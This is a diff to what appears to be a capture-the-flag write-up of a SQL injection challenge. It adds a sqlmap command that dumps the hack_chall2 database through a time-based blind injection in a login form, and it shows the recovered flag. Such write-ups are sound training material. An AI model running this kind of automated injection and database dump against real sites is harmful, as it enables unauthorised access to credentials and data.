@@ -8,7 +8,11 @@
 
 * `hack_chall2` was the database, `TAB` was the table, with `PASSWORD` and `USERNAME` as field(s).
 
-* The flag was in one of the rows of the table. `CTF{INJECTKAFLAG}`
+```bash
+python3 sqlmap.py --url https://chall2.hackingbrawl.com/newlogin.php --technique=T --random-agent --data='enroll=a&passes=' --level=5 -D hack_chall2 --dump --no-cast
+```
+
+* The flag was in one of the rows of the table: `CTF{INJECTKAFLAG}`
 
 
 ![image](https://user-images.githubusercontent.com/43957261/125963329-f5b1d70d-ee8f-467e-a72b-c0ea361aeaa3.png)
